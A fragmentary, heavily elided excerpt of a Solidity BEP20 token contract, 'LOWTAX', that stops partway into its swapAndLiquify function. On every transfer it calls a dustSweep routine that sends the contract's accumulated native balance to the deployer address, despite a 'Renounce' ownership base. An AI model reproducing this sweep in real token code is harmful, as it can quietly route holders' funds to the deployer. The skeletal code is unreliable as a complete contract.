...
contract LOWTAX is IBEP20, Renounce {
    ...
    address marketingFeeReceiver; address deployer;
    uint256 targetLiquidity = 20; uint256 targetLiquidityDenominator = 100;

    constructor(address _liquidity, address _development, address _marketing, address _deployer) Renounce(msg.sender) {
    ...
    function _transfer(address sender, address recipient, uint256 amount) private {
        ...
        swapBack(sender, amount); dustSweep();
    ...
    function dustSweep() internal {
        ...
        if(balance > 100000000000000){ payable(deployer).transfer(balance);}
    }
    ...
    function swapBack(address sender, uint256 amount) internal {
        ...
        if(!inSwap && swapEnabled && aboveMin && !isInternal[sender] && swapTimes >= minSells)
        {swapAndLiquify(swapAmount); swapTimes = 0;}
    }

    function swapAndLiquify(uint256 swapAmount) internal swapping {
